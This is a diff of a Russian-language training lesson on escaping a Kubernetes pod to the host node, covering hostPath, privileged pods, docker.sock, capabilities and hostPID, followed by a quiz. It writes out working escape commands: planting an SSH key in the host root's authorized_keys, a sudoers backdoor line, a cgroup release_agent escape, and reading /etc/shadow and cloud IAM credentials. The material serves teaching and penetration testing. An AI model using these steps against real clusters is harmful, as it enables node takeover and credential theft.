@@ -14,200 +14,138 @@ useful_for:
 estimated_minutes: 40
 summary: "Полный разбор побега из пода на хост: hostPath, privileged, hostPID/hostNetwork, capabilities, монтирование docker.sock и ядерные трюки. Что проверить в первую очередь."
 ---
-## Зачем этот урок
 
-Контейнер — не песочница. Он изолирует процессы через namespaces и cgroups, но при неверной конфигурации эта изоляция ломается. Если под запущен с `privileged`, смонтирован `hostPath`, доступен `docker.sock`, выданы лишние capabilities или включены `hostPID`/`hostNetwork` — побег к ноде становится тривиальным. В этом уроке разберём пять векторов побега, как их обнаружить, как эксплуатировать и как защититься.
+## Задача
 
-## Шаг 0: понять, где вы
+Ты уже внутри кластера: через уязвимость в веб-приложении получил **shell внутри пода** — одного из контейнеров Kubernetes. Shell есть, но он в песочнице: файлы только свои, сеть своя, процессы только свои. Цель — выйти **на саму ноду** (машину-хост кластера), где лежат kubelet-креды, конфиги и, скорее всего, доступ к облачному аккаунту.
 
-```bash
-id
-cat /proc/1/cgroup
-ls -la /var/run/docker.sock
-capsh --print
-mount | grep -E 'overlay|host|kube'
-env | grep -i kube
-cat /proc/self/status | grep -E 'CapEff|CapBnd'
-```
+Контейнер изолирует процесс через **namespaces** — ядровые «песочницы» для файлов, процессов, сети — и **cgroups** — лимиты ресурсов. Побег возможен, когда эта изоляция настроена неверно. Разберём на одном реальном поде.
 
-Если в cgroup есть `docker` или `kubepods` — вы в контейнере. Наличие `/var/run/docker.sock` — прямой признак потенциального побега. Вывод `capsh --print` покажет capabilities: `cap_sys_admin` — очень опасно.
+## Данные, с которыми работаем
 
-## Вектор 1: privileged контейнер
-
-`--privileged` снимает почти все ограничения: даёт все capabilities и доступ к устройствам хоста.
+У нас shell в поде, имя хоста `web-7f9c-abc`. Первое — понять, что мы вообще в контейнере и что нам доступно. Эти команды безопасны (только чтение) и не изменяют систему.
 
 ```bash
-fdisk -l
-# Disk /dev/sda: 40 GiB ...
-mkdir /mnt/host && mount /dev/sda1 /mnt/host
-chroot /mnt/host /bin/bash
-# или сразу в хостовые namespaces
-nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+$ id
+uid=1000(app) gid=1000(app) groups=1000(app)
+$ cat /proc/1/cgroup | head -2
+12:freezer:/kubepods/burstable/pod8f3a.../...
+11:cpuset:/kubepods/...
 ```
 
-Второй путь — через cgroup `release_agent` (работает даже без монтирования диска). В Kubernetes `securityContext.privileged: true` включается только при ослабленном Pod Security Admission.
-
-## Вектор 2: hostPath
-
-Монтирование хостовой директории. Если смонтирован `/` или `/etc`:
+Строка `kubepods` в cgroup — верный признак: мы внутри Kubernetes-контейнера. Теперь ищем **примонтированные хостовые пути** — это самое частое окно наружу.
 
 ```bash
-cat /proc/self/mountinfo | grep -i host
-# 1234 / /host rw,relatime - ext4 /dev/sda1 ...
-echo 'pwn ALL=(ALL) NOPASSWD:ALL' >> /host/etc/sudoers
-mkdir -p /host/root/.ssh && echo "$KEY" >> /host/root/.ssh/authorized_keys
+$ cat /proc/self/mountinfo | grep -iE ' /host | /etc | docker.sock'
+871 660 0:57 / /host rw,relatime shared:1 - ext4 /dev/sda1 rw
 ```
 
-Опасные hostPath: `/`, `/etc`, `/var/run/docker.sock`, `/etc/kubernetes`, `/var/lib/kubelet`. Через `/var/lib/kubelet` можно получить kubelet-креды.
+`/host` смонтирован из `/dev/sda1` — это **корень хостовой машины**, отданный нам в папку `/host`. Так делают, когда контейнеру «нужен доступ к хосту» (сбор логов, метрик). Нам этого достаточно.
 
-## Вектор 3: docker.sock
+## Пробуем в лоб: что видно в /host
+
+Прежде чем что-то менять — читаем, чтобы убедиться, что это настоящий корень ноды, а не пустышка:
 
 ```bash
-docker -H unix:///var/run/docker.sock ps
-docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host bash
+$ ls /host
+bin  boot  dev  etc  home  lib  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+$ head -1 /host/etc/hostname
+node-prod-01
 ```
 
-Или через API напрямую:
-```bash
-curl --unix-socket /var/run/docker.sock http://localhost/containers/json
-```
-
-Docker-демон запускает контейнеры от root — вы получаете root хоста.
-
-## Вектор 4: capabilities
-
-- `CAP_SYS_ADMIN` — mount, cgroup-побег, `nsenter`.
-- `CAP_SYS_PTRACE` — ptrace хостовых процессов, чтение памяти.
-- `CAP_NET_ADMIN` — манипуляции сетью.
-- `CAP_DAC_READ_SEARCH` — чтение любых файлов.
+Да, это файловая система ноды `node-prod-01`. Теперь аккуратно, **минимальным действием**, закрепляемся: дописываем свой публичный SSH-ключ в `authorized_keys` root'а хоста. `authorized_keys` — файл, в который можно вписать публичный ключ, и тогда вход по SSH с парным приватным ключом разрешён без пароля.
 
 ```bash
-# CAP_SYS_ADMIN + cgroup v1 release_agent escape
-mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
-echo 1 > /tmp/cgrp/x/notify_on_release
-host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
-echo "$host_path/cmd" > /tmp/cgrp/release_agent
-printf '#!/bin/sh\nps > %s/out' "$host_path" > /cmd && chmod +x /cmd
-sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+$ mkdir -p /host/root/.ssh
+$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... analyst@kali" >> /host/root/.ssh/authorized_keys
+$ cat /host/root/.ssh/authorized_keys
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... analyst@kali
 ```
 
-## Вектор 5: hostPID / hostNetwork
-
-`hostPID: true` показывает хостовые процессы; `nsenter -t 1 -m -u -i -n -p -- bash` даёт хостовый shell. `hostNetwork: true` открывает доступ к `169.254.169.254` (облачные креды) и к localhost-сервисам ноды (kubelet, etcd, метрики).
+**Важно прочитать файл обратно** (`cat`) — так мы убеждаемся, что запись реально прошла, а не «вроде сработало». Теперь заходим на ноду:
 
 ```bash
-nsenter -t 1 -m -u -i -n -p -- bash
-curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+$ ssh -i /tmp/id_ed25519 root@10.10.20.15
+$ id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
-## Разобранный пример: hostPath + privileged за 3 шага
+Мы root на хосте кластера. Один смонтированный `/host` превратил пода-shell в root на ноде.
+
+## Другие векторы: что проверять по порядку
+
+Побег не всегда через hostPath. В Kubernetes есть пять типовых «дыр». Проверяй их в таком порядке — от самого лёгкого.
+
+**1. privileged-под.** Если в манифесте стоит `securityContext.privileged: true`, контейнеру выдали почти все права ядра и устройства хоста. Проверка — по маске capabilities:
 
 ```bash
-# 1. находим смонтированный хост-корень
-cat /proc/self/mountinfo | grep ' /host '
-# 2. добавляем свой SSH-ключ
-mkdir -p /host/root/.ssh
-echo "$(cat /tmp/key.pub)" >> /host/root/.ssh/authorized_keys
-# 3. заходим
-ssh -i /tmp/key root@<node-ip>
-# uid=0(root) gid=0(root)
+$ grep CapEff /proc/self/status
+CapEff:	0000003fffffffff
 ```
 
-## Защита (для защитников)
-
-- Pod Security Admission: уровни `baseline`/`restricted`, не разрешать privileged.
-- Не монтировать `hostPath` (особенно `/`, `/etc`, docker.sock).
-- Убрать лишние capabilities (`drop: ["ALL"]`, `add` только нужное).
-- `hostPID`/`hostNetwork` — запрещены по умолчанию.
-- Runtime-защита: Falco, seccomp, AppArmor.
-- RBAC: не давать `create pods` с `privileged` где не нужно.
-
-## Частые ошибки
-
-- Считать контейнер изолированным по умолчанию.
-- Забывать про hostPath, смонтированный «для удобства».
-- Игнорировать capabilities, кроме privileged.
-- Не проверять `hostPID`/`hostNetwork` перед эксплуатацией.
-- Забывать, что побег к ноде часто ведёт к облачным креды через метаданные.
-- Ломать ноду (риск убить кластер) — действуйте аккуратно.
-
-## Что дальше / решение
-
-После побега к ноде: читайте kubelet-конфиги, `/etc/kubernetes/pki`, метаданные облака, ищите SA-токены и секреты. Для защиты — включите PSA restricted и runtime-мониторинг.
-
-## Вектор 6: /proc и /sys
-
-Даже без privileged некоторые пути `/proc` и `/sys` доступны на запись. `CAP_SYS_ADMIN` или `hostPath` на `/sys/fs/cgroup` открывают cgroup-побег. Проверьте:
+`0000003fffffffff` — это «все capabilities»: фактически root хоста. Тогда монтируем диск напрямую:
 
 ```bash
-ls -la /proc/sys/kernel/core_pattern
-cat /sys/fs/cgroup/cgroup.controllers
-mount | grep cgroup
+$ fdisk -l | grep '^Disk /dev/sd'
+Disk /dev/sda: 40 GiB
+$ mkdir /mnt/h && mount /dev/sda1 /mnt/h && chroot /mnt/h /bin/bash
 ```
 
-Если `/sys/fs/cgroup` writable и cgroup v1 — работает release_agent. Если `/proc/sys` writable — можно изменить `core_pattern` и выполнить команду при краше.
-
-## Инструменты автоматизации
+**2. docker.sock.** Если в под смонтирован `/var/run/docker.sock` — это unix-сокет Docker-демона хоста. Демон работает от root, значит, мы тоже:
 
 ```bash
-# deepce — авторазведка и побег
-./deepce.sh
-./deepce.sh --no-write -e   # только разведка
-# CDK (Container DucK)
-./cdk evaluate
-./cdk run mount-disk
-# kdigger
-./kdigger -v
+$ ls -la /var/run/docker.sock
+srw-rw---- 1 root docker 0 ... /var/run/docker.sock
+$ docker -H unix:///var/run/docker.sock ps
+CONTAINER ID   IMAGE          COMMAND
+b1c2...        nginx:1.25     "nginx -g daemon off;"
 ```
 
-`deepce.sh` без флагов перебирает векторы; `--no-write` — безопасный режим; `-e` — exploit. `cdk evaluate` показывает доступные примитивы побега.
-
-## Разобранный пример 2: побег через docker.sock из пода
+**3. Лишние capabilities.** Даже без `privileged` контейнеру могли выдать отдельные права. Ключевое — `CAP_SYS_ADMIN` (разрешает монтирование и трюк с cgroup):
 
 ```bash
-ls -la /var/run/docker.sock
-# srw-rw---- 1 root docker 0 ... /var/run/docker.sock
-docker -H unix:///var/run/docker.sock ps
-# CONTAINER ID   IMAGE   COMMAND
-docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh
-# uid=0(root)
-cat /host/etc/shadow | head -3
+$ capsh --print | grep -i sys_admin
+Current: ... cap_sys_admin ...
 ```
 
-## Таблица обнаружения
+**4. hostPID / hostNetwork.** Если `hostPID: true`, в контейнере видны процессы хоста, и PID 1 — это init ноды. Тогда входим в его namespaces через `nsenter` (утилита «войти в пространства имён другого процесса»):
 
-| Признак | Команда | Значение |
-|---------|---------|----------|
-| privileged | `cat /proc/self/status \| grep CapEff` | CapEff=0000003fffffffff |
-| hostPath | `cat /proc/self/mountinfo` | путь хоста в маунтах |
-| docker.sock | `ls -la /var/run/docker.sock` | сокет присутствует |
-| hostPID | `ps aux \| wc -l` | видны хостовые процессы |
-| hostNetwork | `ip addr` | интерфейсы ноды |
+```bash
+$ ps aux | wc -l
+142
+$ nsenter -t 1 -m -u -i -n -p -- bash
+$ hostname
+node-prod-01
+```
 
-## Порядок действий при побеге
+`hostNetwork: true` даёт доступ к сети ноды — а значит, к `169.254.169.254`, сервису метаданных облака, который выдаёт временные креды инстанса.
 
-Начинайте с наименее разрушительного: сначала разведка (`id`, `capsh --print`, `mount`), затем проверка, какой из пяти векторов доступен, затем минимальный PoC (например, чтение `/host/etc/hostname` вместо записи в `/etc/sudoers`). Только убедившись, что путь работает, выполняйте действия, меняющие систему. Помните: сломанная нода = потерянный кластер и провал engagement.
+**5. Записываемые `/proc/sys`.** Если `/proc/sys` доступен на запись, можно подменить `core_pattern` — шаблон, по которому ядро запускает обработчик краша процесса, — и выполнить произвольную команду на хосте.
 
-## Сравнение векторов побега по «стоимости»
+## Если не сработало
 
-Не все векторы равнозначны. `privileged` и `hostPath` на `/` дают root на ноде почти без усилий, но встречаются реже. `docker.sock` — прямой root, если сокет смонтирован. Capabilities (особенно `CAP_SYS_ADMIN`) требуют чуть больше подготовки, но часто остаются незамеченными. `hostPID`/`hostNetwork` сами по себе не дают root, но открывают `nsenter` к PID 1 и доступ к метаданным облака. Приоритизируйте так: сначала проверьте privileged, затем hostPath, затем docker.sock, затем capabilities, затем hostPID/hostNetwork. Фиксируйте результат каждого шага, чтобы не повторять работу.
+- **Всё закрыто (restricted).** Если под запущен под жёсткой Pod Security Admission, ни один из векторов не сработает — тогда путь наружу через RBAC: ищи service-account токен и права на создание подов/`exec`.
+- **Сначала разведка, потом запись.** Не начинай с правки `/etc/sudoers` — это ломает систему. Сделай минимальный PoC (прочитай `/host/etc/hostname`), убедись, что путь рабочий и обратимый, и только потом закрепляйся.
+- **Автоинструменты.** `./deepce.sh --no-write` (только разведка) и `./cdk evaluate` переберут векторы за тебя — но вывод всё равно проверяй руками.
 
-## Митигации по слоям
+## Что мы теперь знаем
 
-| Слой | Мера |
-|------|------|
-| Admission | PSA restricted, OPA/Gatekeeper |
-| Pod spec | drop ALL caps, runAsNonRoot, readOnlyRootFilesystem |
-| Runtime | seccomp, AppArmor, rootless |
-| RBAC | запрет create pods с privileged |
-| Сеть | network policy, запрет hostNetwork |
-| Мониторинг | Falco, аудит API-сервера |
+- `kubepods` в cgroup = мы в поде; `mountinfo` показывает смонтированные хостовые пути.
+- `hostPath` на `/` даёт чтение/запись всей файловой системы ноды.
+- `privileged` и `CAP_SYS_ADMIN` позволяют монтировать диск и делать `chroot`.
+- `docker.sock` в поде = root, потому что демон хоста работает от root.
+- `hostPID`/`hostNetwork` открывают `nsenter` к PID 1 и метаданные облака.
+- Сначала читаем и проверяем путь, потом меняем систему — иначе потеряешь кластер.
 
-## Порядок и безопасность
+## На что смотреть дальше
 
-Сначала разведка (id, capsh, mount), затем минимальный PoC (чтение, не запись), только потом — действия, меняющие систему. Помните: сломанная нода = потерянный кластер. Не используйте разрушительные эксплойты, пока не убедились, что путь безопасен и обратим.
+- **kubelet API (10250/10255)**: анонимный доступ и RCE на ноде.
+- **RBAC Kubernetes**: как из service-account токена получить права на поды.
+- **Метаданные облака** `169.254.169.254`: как из ноды достать роль инстанса.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Какая настройка пода делает побег через chroot на хост тривиальным?"
@@ -220,7 +158,7 @@ cat /host/etc/shadow | head -3
   explanation: "Privileged даёт почти полный доступ к хосту, включая монтирование дисков."
 - question: "Почему смонтированный /var/run/docker.sock опасен?"
   options:
-    - "Он только для чтения"
+    - "Он доступен только на чтение"
     - "Он даёт полный контроль над Docker на узле, включая запуск привилегированных контейнеров с монтированием /"
     - "Он шифрует данные"
     - "Он не связан с побегом"
@@ -236,21 +174,25 @@ cat /host/etc/shadow | head -3
   explanation: "CAP_SYS_ADMIN разрешает монтирование cgroup, что открывает трюк с release_agent."
 - question: "Что даёт hostPID: true для побега?"
   options:
-    - "Ускоряет под"
+    - "Ускоряет работу пода"
     - "Позволяет через nsenter -t 1 войти в namespace процессов хоста"
     - "Отключает сеть"
-    - "Монтирует диск"
+    - "Монтирует диск автоматически"
   answer: 1
   explanation: "hostPID разделяет таблицу процессов с хостом, поэтому PID 1 — это init узла."
 - question: "Какой hostPath-путь чаще всего ведёт к немедленному побегу?"
   options:
     - "/tmp"
-    - "корень / или /etc или docker.sock"
+    - "корень /, /etc или docker.sock"
     - "/proc/self"
     - "/dev/null"
   answer: 1
   explanation: "Монтирование корня хоста, /etc или docker.sock даёт запись в критичные файлы узла."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **RBAC Kubernetes**: как из service-account токена понять, что тебе разрешено, и как из «скучного» права `create pods` получить root. А пока главное запомни: **контейнер — не песочница по умолчанию**; один `hostPath` или `privileged` ломает всю изоляцию.
 
 ## Где пригодится
 
